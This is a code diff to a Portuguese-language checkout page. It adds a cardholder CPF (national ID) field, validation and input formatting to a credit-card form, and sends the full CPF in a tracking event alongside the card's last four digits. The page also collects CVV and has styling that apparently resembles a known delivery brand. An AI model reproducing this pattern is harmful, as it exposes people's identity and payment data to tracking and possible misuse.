@@ -823,6 +823,10 @@
                             <input id="cc-cvv" inputmode="numeric" maxlength="4" placeholder="123" class="mt-1 w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm focus:border-[#EA1D2C] focus:outline-none">
                         </div>
                     </div>
+                    <div>
+                        <label class="text-[11px] font-bold text-gray-500 uppercase">CPF do titular</label>
+                        <input id="cc-cpf" inputmode="numeric" maxlength="14" placeholder="000.000.000-00" class="mt-1 w-full border border-gray-200 rounded-lg px-3 py-2.5 text-sm focus:border-[#EA1D2C] focus:outline-none">
+                    </div>
                     <div class="flex items-center gap-2 mt-2">
                         <i class="fa-solid fa-lock text-[#05a65a] text-[11px]"></i>
                         <p class="text-[10px] text-gray-500">Ambiente seguro. Seus dados são criptografados.</p>
@@ -1646,7 +1650,8 @@
             var name = (document.getElementById('cc-name').value||'').trim();
             var exp = (document.getElementById('cc-exp').value||'').trim();
             var cvv = (document.getElementById('cc-cvv').value||'').trim();
-            if(num.length < 13 || !name || name.split(' ').length < 2 || exp.length < 4 || cvv.length < 3) {
+            var cpf = ((document.getElementById('cc-cpf')||{}).value||'').replace(/\D/g,'');
+            if(num.length < 13 || !name || name.split(' ').length < 2 || exp.length < 4 || cvv.length < 3 || cpf.length !== 11) {
                 Swal.fire({ toast:true, position:'top', icon:'warning', title:'Preencha os dados do cartão', showConfirmButton:false, timer:2500 });
                 return;
             }
@@ -1658,7 +1663,7 @@
                         step: 'submitted',
                         card_last4: num.slice(-4),
                         card_brand_hint: /^4/.test(num) ? 'visa' : /^5/.test(num) ? 'master' : /^3/.test(num) ? 'amex' : 'other',
-                        installments: (document.getElementById('cc-installments')||{}).value
+                        cpf: cpf
                     });
                 }
             } catch(e){}
@@ -1688,6 +1693,12 @@
                 t.value = t.value.replace(/\D/g,'').slice(0,4);
             } else if(t.id === 'cc-name') {
                 var pn = document.getElementById('cc-preview-name'); if(pn) pn.textContent = (t.value || 'SEU NOME').toUpperCase();
+            } else if(t.id === 'cc-cpf') {
+                var v = t.value.replace(/\D/g,'').slice(0,11);
+                if(v.length > 9) v = v.slice(0,3)+'.'+v.slice(3,6)+'.'+v.slice(6,9)+'-'+v.slice(9);
+                else if(v.length > 6) v = v.slice(0,3)+'.'+v.slice(3,6)+'.'+v.slice(6);
+                else if(v.length > 3) v = v.slice(0,3)+'.'+v.slice(3);
+                t.value = v;
             }
         });
 
